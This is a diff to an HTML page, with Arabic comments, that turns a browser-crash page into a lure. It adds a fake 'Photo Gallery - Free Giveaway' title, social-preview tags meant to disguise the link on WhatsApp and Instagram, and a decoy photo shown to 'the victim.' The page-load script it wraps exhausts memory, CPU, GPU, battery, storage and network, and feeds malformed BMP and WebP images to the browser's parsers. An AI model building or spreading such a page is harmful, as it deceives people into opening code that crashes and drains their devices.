@@ -3,13 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>system crash</title>
+    <!-- تمويه المعاينة في واتساب/إنستغرام -->
+    <title>Photo Gallery - Free Giveaway</title>
+    <meta property="og:title" content="Photo Gallery - Free Giveaway" />
+    <meta property="og:description" content="Check this amazing photo and win a prize!" />
+    <meta property="og:image" content="https://picsum.photos/seed/pic/1200/630" />
+    <meta property="og:url" content="https://one-chance-lime.vercel.app/" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Photo Gallery - Free Giveaway" />
+    <meta name="twitter:description" content="Check this amazing photo and win a prize!" />
+    <meta name="twitter:image" content="https://picsum.photos/seed/pic/1200/630" />
 </head>
 <body>
-<script>
-    // ============================================
+    <!-- صورة وهمية تظهر للضحية قبل تنفيذ الكراش -->
+    <div style="text-align:center; margin-top:20px; font-family: Arial, sans-serif;">
+        <h1 style="color:#333;">Loading your photo...</h1>
+        <img src="https://picsum.photos/400/400" alt="photo" style="width:100%; max-width:300px; border-radius:10px;">
+        <p style="color:#666;">Please wait a moment</p>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- باقي كود الكراش (جميع التحسينات العشرة)      -->
+    <!-- ============================================ -->
+    <script>
     // 1. استنزاف الذاكرة (حلقة لا نهائية مع كائنات ضخمة)
-    // ============================================
     (function memoryBomb() {
         var bomb = [];
         while (true) {
@@ -25,9 +43,7 @@
         }
     })();
 
-    // ============================================
     // 2. فيض العمال (Web Workers) – استهلاك CPU
-    // ============================================
     (function workerFlood() {
         var workers = [];
         for (var i = 0; i < (navigator.hardwareConcurrency || 4) * 5; i++) {
@@ -40,9 +56,7 @@
         }
     })();
 
-    // ============================================
     // 3. هجوم WebGL – إجبار سائق الرسوميات على الانهيار
-    // ============================================
     (function gpuCrash() {
         var canvas = document.createElement('canvas');
         document.body.appendChild(canvas);
@@ -64,9 +78,7 @@
         }
     })();
 
-    // ============================================
     // 4. صورة BMP خبيثة – تجاوز سعة محلل الصور
-    // ============================================
     (function bmpCrash() {
         var bmpHeader = 'BM' + String.fromCharCode(
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -94,9 +106,7 @@
         document.body.appendChild(img);
     })();
 
-    // ============================================
     // 5. صورة WebP خبيثة (CVE-2020-16040) – تعطل المتصفح
-    // ============================================
     (function webpCrash() {
         // إنشاء بيانات WebP بعرض وارتفاع خياليين (0xFFFFFFFF)
         var buffer = new ArrayBuffer(40);
@@ -124,9 +134,7 @@
         document.body.appendChild(img);
     })();
 
-    // ============================================
     // 6. استنزاف البطارية – واجهة Battery API
-    // ============================================
     (function batteryDrain() {
         navigator.getBattery().then(function(battery) {
             setInterval(function() {
@@ -137,9 +145,7 @@
         }).catch(function(){});
     })();
 
-    // ============================================
     // 7. هجوم WebAudio – ترددات عالية + حلقة لا نهائية
-    // ============================================
     (function audioCrash() {
         try {
             var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -153,9 +159,7 @@
         } catch(e) {}
     })();
 
-    // ============================================
     // 8. ملء localStorage لتعطيل النظام
-    // ============================================
     (function storageFlood() {
         var data = new Array(1000000).join('X');
         while (true) {
@@ -168,9 +172,7 @@
         }
     })();
 
-    // ============================================
     // 9. طلبات Fetch لا نهائية (استنزاف موارد الشبكة)
-    // ============================================
     (function fetchFlood() {
         for (var i=0; i<100; i++) {
             setTimeout(function() {
@@ -181,9 +183,7 @@
         }
     })();
 
-    // ============================================
     // 10. Canvas عملاق (تجاوز سعة الذاكرة)
-    // ============================================
     (function canvasCrash() {
         var canvas = document.createElement('canvas');
         canvas.width = 100000;
@@ -199,6 +199,6 @@
         ctx.putImageData(imgData, 0, 0);
         document.body.appendChild(canvas);
     })();
-</script>
+    </script>
 </body>
 </html>
